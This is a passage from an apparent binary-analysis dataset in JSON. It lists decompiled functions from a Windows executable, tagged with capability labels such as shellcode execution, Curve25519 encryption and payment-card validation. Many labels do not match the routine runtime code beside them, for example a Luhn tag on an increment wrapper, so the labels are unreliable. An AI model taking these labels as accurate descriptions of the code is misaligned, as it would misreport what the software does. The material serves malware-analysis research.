        "decompiled_code": "\nvoid fcn.0045ebe8(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x10) & 0x3f;\n    *(in_EAX + 0x18 + uVar1) = 0x80;\n    if (0x37 - uVar1 < 0) {\n        fcn.00403af4();\n        fcn.0045ec78();\n    }\n    fcn.00403af4();\n    *(in_EAX + 0x50) = *(in_EAX + 0x10) * 8;\n    *(in_EAX + 0x54) = *(in_EAX + 0x14) * 8 | *(in_EAX + 0x10) >> 0x1d;\n    fcn.0045ec78();\n    fcn.004030fc();\n    fcn.00403af4();\n    return;\n}\n",
        "token_count": 216
    },
    "0040dcfc": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0040dcfc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iVar1 = fcn.004030dc();\n    for (iVar2 = 0; (iVar2 < 7 && (iVar1 != *(iVar2 * 8 + 0x491938))); iVar2 = iVar2 + 1) {\n    }\n    if (iVar2 < 7) {\n        iVar2 = fcn.0040dafc();\n    }\n    else {\n        uStack12 = 0;\n        iStack16 = iVar1;\n        iVar2 = fcn.0040dbf4(0, &iStack16);\n    }\n    *(iVar2 + 0xc) = iVar1;\n    return;\n}\n",
        "token_count": 179
    },
    "00453d14": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00453d14(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar in_CL;\n    int32_t in_EDX;\n    uint var_5h;\n    \n    uVar1 = 0;\n    // switch table (7 cases) at 0x453d3a\n    switch(in_CL) {\n    case 1:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 2:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 3:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 4:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 6:\n        uVar1 = (**(**(arg_8h + -4) + 0xa8))();\n    }\n    return uVar1;\n}\n",
        "token_count": 556
    },
    "0046587c": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0046587c(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((arg_8h & 0x4000000) != 0) {\n        uVar1 = 0x200;\n    }\n    if ((arg_8h & 0x20000000) == 0) {\n        if ((arg_8h & 0x40000000) == 0) {\n            if ((arg_8h & 0x80000000) == 0) {\n                uVar1 = uVar1 | 1;\n            }\n            else {\n                uVar1 = uVar1 | 8;\n            }\n        }\n        else if ((arg_8h & 0x80000000) == 0) {\n            uVar1 = uVar1 | 2;\n        }\n        else {\n            uVar1 = uVar1 | 4;\n        }\n    }\n    else if ((arg_8h & 0x40000000) == 0) {\n        if ((arg_8h & 0x80000000) == 0) {\n            uVar1 = uVar1 | 0x10;\n        }\n        else {\n            uVar1 = uVar1 | 0x80;\n        }\n    }\n    else if ((arg_8h & 0x80000000) == 0) {\n        uVar1 = uVar1 | 0x20;\n    }\n    else {\n        uVar1 = uVar1 | 0x40;\n    }\n    return uVar1;\n}\n",
        "token_count": 359
    },
    "00424230": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00424230(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (in_EAX < 0) {\n        sub.user32.dll_GetSysColor(in_EAX & 0xff);\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "004681c4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004681c4(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x14);\n    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    *(*(in_EAX + 8) + iVar1) = param_2 >> 8;\n    iVar1 = *(in_EAX + 0x14);\n    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    *(*(in_EAX + 8) + iVar1) = param_2;\n    return;\n}\n",
        "token_count": 163
    },
    "0046c370": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c370(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x16b8) < 0xe) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = arg_8h >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n    }\n    fcn.0046cfd4(1);\n    return;\n}\n",
        "token_count": 436
    },
    "0046cef8": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0046cef8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x16b8) == 0x10) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = 0;\n        *(in_EAX + 0x16b8) = 0;\n        return;\n    }\n    if (7 < *(in_EAX + 0x16b8)) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -8;\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "0048f6d4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0048f6d4(void)\n\n{\n    uint8_t uVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x48f75a;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar2 = *0x499c6c == 0;\n    *0x499c6c = *0x499c6c + -1;\n    if (bVar2) {\n        uVar1 = sub.kernel32.dll_GetVersion();\n        *0x499c68 = 3 < uVar1;\n        fcn.0045dae0();\n        fcn.004190d4();\n        fcn.00419174();\n        fcn.00419120();\n        fcn.00419120();\n        fcn.00419120();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 237
    },
    "00462078": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00462078(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46208f;\n    fcn.004059cc();\n    uStack28 = 0x4620e4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.0040a5a0();\n    fcn.00405584();\n    fcn.0040a68c();\n    fcn.00405584();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4620eb;\n    uStack28 = 0x4620e3;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 208
    },
    "00462bb0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00462bb0(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = 0;\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    *(in_EAX + 0x1c) = 0;\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    *(in_EAX + 0x3c) = 0;\n    fcn.0040700c();\n    fcn.0040700c();\n    *(in_EAX + 0x48) = 0;\n    *(in_EAX + 0x4c) = 0;\n    fcn.00404620();\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00462c84();\n    *arg_8h = uVar1;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 401
    },
    "00475b8c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00475b8c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x475b9e;\n    fcn.004059cc();\n    uStack20 = 0x475bcd;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405584();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x475bd4;\n    uStack20 = 0x475bcc;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 166
    },
    "0047f988": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0047f988(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x47f99a;\n    fcn.004059cc();\n    uStack20 = 0x47f9c9;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405584();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x47f9d0;\n    uStack20 = 0x47f9c8;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 173
    },
    "00489470": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00489470(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x489482;\n    fcn.004059cc();\n    uStack20 = 0x4894b1;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405584();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4894b8;\n    uStack20 = 0x4894b0;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 167
    },
    "00433aec": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: uCode\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00433aec(void)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint lpString;\n    uint uCode;\n    \n    uCode._0_1_ = in_AL;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_MapVirtualKeyA(uCode, 0);\n    if (iVar1 << 0x10 != 0) {\n        sub.user32.dll_GetKeyNameTextA(iVar1 << 0x10, &lpString, 0x100);\n        fcn.004057a0();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "004645b8": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004645b8(int32_t *param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iStack32;\n    uint8_t *puStack28;\n    uint8_t *puStack24;\n    int32_t iStack20;\n    \n    fcn.00464458();\n    iStack20 = (**(*param_1 + 0x20))();\n    if (-1 < iStack20 + -1) {\n        iStack32 = 0;\n        puStack28 = param_2;\n        do {\n            puVar1 = fcn.00429b20();\n            iVar2 = (**(*param_1 + 0x2c))();\n            iVar3 = (**(*param_1 + 0x20))();\n            iVar5 = iStack32;\n            if (iStack32 < 0) {\n                iVar5 = iStack32 + 3;\n            }\n            puVar6 = param_2 + iVar2 * (iVar3 + (iVar5 >> 2));\n            iVar5 = (**(*param_1 + 0x2c))();\n            iVar2 = (**(*param_1 + 0x20))();\n            iVar5 = iVar5 * iVar2;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + 3;\n            }\n            puStack24 = puVar6 + (iVar5 >> 2);\n            uVar4 = (**(*param_1 + 0x2c))();\n            iVar5 = uVar4 >> 1;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + ((uVar4 & 1) != 0);\n            }\n            if (-1 < iVar5 + -1) {\n                do {\n                    iVar2 = *(in_EAX + 0x4c + *puStack28 * 4);\n                    iVar3 = *(in_EAX + 0x84c + *puVar6 * 4) + iVar2;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    *puVar1 = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x44c + *puVar6 * 4) + iVar2 + *(in_EAX + 0x104c + *puStack24 * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[1] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar2 = iVar2 + *(in_EAX + 0xc4c + *puStack24 * 4);\n                    if (iVar2 < 0) {\n                        iVar2 = iVar2 + 0xff;\n                    }\n                    puVar1[2] = *(in_EAX + 0x184b + (iVar2 >> 8));\n                    iVar2 = *(in_EAX + 0x4c + puStack28[1] * 4);\n                    iVar3 = *(in_EAX + 0x84c + *puVar6 * 4) + iVar2;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[3] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x44c + *puVar6 * 4) + iVar2 + *(in_EAX + 0x104c + *puStack24 * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[4] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar2 = iVar2 + *(in_EAX + 0xc4c + *puStack24 * 4);\n                    if (iVar2 < 0) {\n                        iVar2 = iVar2 + 0xff;\n                    }\n                    puVar1[5] = *(in_EAX + 0x184b + (iVar2 >> 8));\n                    puVar1 = puVar1 + 6;\n                    puStack28 = puStack28 + 2;\n                    puVar6 = puVar6 + 1;\n                    puStack24 = puStack24 + 1;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            iStack32 = iStack32 + 1;\n            iStack20 = iStack20 + -1;\n        } while (iStack20 != 0);\n    }\n    return;\n}\n",
        "token_count": 1080
    },
    "004647b0": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004647b0(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *extraout_var;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iStack20;\n    \n    fcn.00464458();\n    piVar6 = extraout_var;\n    iStack20 = (**(*extraout_var + 0x20))();\n    if (-1 < iStack20 + -1) {\n        iVar7 = 0;\n        do {\n            puVar1 = fcn.00429b20(piVar6, iVar7);\n            uVar2 = (**(*piVar6 + 0x2c))();\n            iVar5 = uVar2 >> 1;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + ((uVar2 & 1) != 0);\n            }\n            if (-1 < iVar5 + -1) {\n                do {\n                    iVar3 = *(in_EAX + 0x4c + *param_2 * 4);\n                    iVar4 = *(in_EAX + 0x84c + param_2[1] * 4) + iVar3;\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    *puVar1 = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar4 = *(in_EAX + 0x44c + param_2[1] * 4) + iVar3 + *(in_EAX + 0x104c + param_2[3] * 4);\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[1] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar3 = iVar3 + *(in_EAX + 0xc4c + param_2[3] * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[2] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x4c + param_2[2] * 4);\n                    iVar4 = *(in_EAX + 0x84c + param_2[1] * 4) + iVar3;\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[3] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar4 = *(in_EAX + 0x44c + param_2[1] * 4) + iVar3 + *(in_EAX + 0x104c + param_2[3] * 4);\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[4] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar3 = iVar3 + *(in_EAX + 0xc4c + param_2[3] * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[5] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    puVar1 = puVar1 + 6;\n                    param_2 = param_2 + 4;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            iVar7 = iVar7 + 1;\n            iStack20 = iStack20 + -1;\n        } while (iStack20 != 0);\n    }\n    return;\n}\n",
        "token_count": 893
    },
    "004070e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004070e0(int32_t arg_8h)\n\n{\n    sub.kernel32.dll_InterlockedIncrement(arg_8h + 4);\n    return;\n}\n",
        "token_count": 40
    },
    "004015a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015a0(int32_t param_1, int32_t param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    param_1 = param_1 + -0xc;\n    iVar2 = in_EAX + param_1;\n    param_2 = param_2 + param_1;\n    iVar3 = -param_1;\n    if (0 < param_1) {\n        do {\n            iVar1 = *(iVar3 + iVar2);\n            *(iVar3 + 8 + param_2) = ROUND(*(iVar3 + 8 + iVar2));\n            *(iVar3 + param_2) = ROUND(iVar1);\n            iVar3 = iVar3 + 0x10;\n        } while (iVar3 < 0);\n    }\n    *(iVar3 + param_2) = ROUND(*(iVar3 + iVar2));\n    *(iVar3 + 8 + param_2) = *(iVar3 + 8 + iVar2);\n    return;\n}\n",
        "token_count": 235
    },
    "0040248c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040248c(int32_t param_1, int32_t param_2)\n\n{\n    fcn.004030fc();\n    return param_2 + param_1;\n}\n",
        "token_count": 47
    },
    "00402520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402520(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    \n    if (((999 < in_EDX) || (cVar1 = fcn.004024a4(arg_8h),  cVar1 == '\\0')) ||\n       (cVar1 = fcn.004024a4(arg_8h),  cVar1 == '\\0')) {\n        return 0;\n    }\n    if ((in_EAX == *(in_EAX + -0x4c)) &&\n       ((*(in_EAX + -0x24) == 0 ||\n        ((cVar1 = fcn.004024a4(arg_8h),  cVar1 != '\\0' && (cVar1 = fcn.00402520(arg_8h),  cVar1 != '\\0')))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 211
    },
    "004025a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004025a0(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint uVar2;\n    uint var_10h;\n    \n    uVar2 = *in_EAX;\n    cVar1 = fcn.00402520(&stack0xfffffffc);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 94
    },
    "00402e04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402e04(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *0x49570c;\n    while (iVar1 != 0x495708) {\n        iVar1 = *(iVar1 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    iVar2 = 0x37;\n    iVar1 = 0x49104c;\n    do {\n        *(iVar1 + 0x14) = iVar1;\n        *(iVar1 + 4) = iVar1;\n        *(iVar1 + 8) = 1;\n        *(iVar1 + 0xc) = 0;\n        iVar1 = iVar1 + 0x20;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *0x495708 = 0x495708;\n    *0x49570c = 0x495708;\n    iVar2 = 0x400;\n    iVar1 = 0x4957a8;\n    do {\n        *iVar1 = iVar1;\n        *(iVar1 + 4) = iVar1;\n        iVar1 = iVar1 + 8;\n        iVar2 = iVar2 + -1;\n        iVar3 = *0x4977b0;\n    } while (iVar2 != 0);\n    while (iVar3 != 0x4977ac) {\n        iVar3 = *(iVar3 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    *0x4977ac = 0x4977ac;\n    *0x4977b0 = 0x4977ac;\n    return;\n}\n",
        "token_count": 370
    },
    "00403098": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403098(int32_t param_1, int32_t param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    uVar1 = *in_EAX;\n    if (uVar1 == 0) {\n        *param_3 = 0;\n        return;\n    }\n    if (param_2 < 1) {\n        param_2 = 1;\ncode_r0x004030ae:\n        iVar2 = (uVar1 - param_2) + 1;\n        if (-1 < param_1) {\n            if (iVar2 < param_1) {\n                param_1 = iVar2;\n            }\n            goto code_r0x004030b9;\n        }\n    }\n    else if (param_2 <= uVar1) goto code_r0x004030ae;\n    param_1 = 0;\ncode_r0x004030b9:\n    *param_3 = param_1;\n    puVar3 = in_EAX + param_2;\n    for (; param_3 = param_3 + 1,  param_1 != 0; param_1 = param_1 + -1) {\n        *param_3 = *puVar3;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "004030fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.004030fc(uint32_t param_1, int64_t *param_2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    ushort uVar6;\n    uint uVar7;\n    int64_t *in_EAX;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int64_t *piVar11;\n    bool bVar12;\n    \n    if (in_EAX != param_2) {\n        if (0x20 < param_1) {\n            if (0x20 < param_1) {\n                if ((param_2 < in_EAX) ||\n                   (piVar11 = param_2 - param_1,  param_2 = param_1 + piVar11,  in_EAX <= piVar11)) {\n                    iVar2 = *in_EAX;\n                    piVar11 = (param_1 - 8) + in_EAX;\n                    piVar1 = param_2 + (param_1 - 8);\n                    iVar3 = *piVar11;\n                    iVar8 = ((param_2 & 0xfffffff8) + 8) - piVar1;\n                    do {\n                        *(iVar8 + piVar1) = ROUND(*(iVar8 + piVar11));\n                        bVar12 = SCARRY4(iVar8, 8);\n                        iVar8 = iVar8 + 8;\n                    } while (bVar12 != iVar8 < 0);\n                    *piVar1 = ROUND(iVar3);\n                    *param_2 = ROUND(iVar2);\n                    return;\n                }\n                iVar9 = param_1 - 8;\n                iVar2 = *(iVar9 + in_EAX);\n                iVar3 = *in_EAX;\n                iVar8 = (iVar9 + param_2 & 0xfffffff8U) - param_2;\n                do {\n                    *(iVar8 + param_2) = ROUND(*(iVar8 + in_EAX));\n                    iVar10 = iVar8 + -8;\n                    bVar12 = 7 < iVar8;\n                    iVar8 = iVar10;\n                } while (iVar10 != 0 && bVar12);\n                *param_2 = ROUND(iVar3);\n                *(iVar9 + param_2) = ROUND(iVar2);\n            }\n            return;\n        }\n        iVar8 = param_1 - 8;\n        if (iVar8 == 0 || param_1 < 8) {\n            switch(param_1) {\n            case 0:\n                goto code_r0x00403131;\n            case 1:\n                *param_2 = *in_EAX;\n                return;\n            case 2:\n                *param_2 = *in_EAX;\n                return;\n            case 3:\n                uVar5 = *(in_EAX + 2);\n                *param_2 = *in_EAX;\n                *(param_2 + 2) = uVar5;\n                return;\n            case 4:\n                *param_2 = *in_EAX;\n                return;\n            case 5:\n                uVar5 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar5;\n                return;\n            case 6:\n                uVar6 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar6;\n                return;\n            case 7:\n                uVar7 = *(in_EAX + 3);\n                *param_2 = *in_EAX;\n                *(param_2 + 3) = uVar7;\n                return;\n            case 8:\n                *param_2 = ROUND(*in_EAX);\n                return;\n            case 9:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xb:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xc:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xd:\n    // WARNING: Bad instruction - Truncating control flow here\n                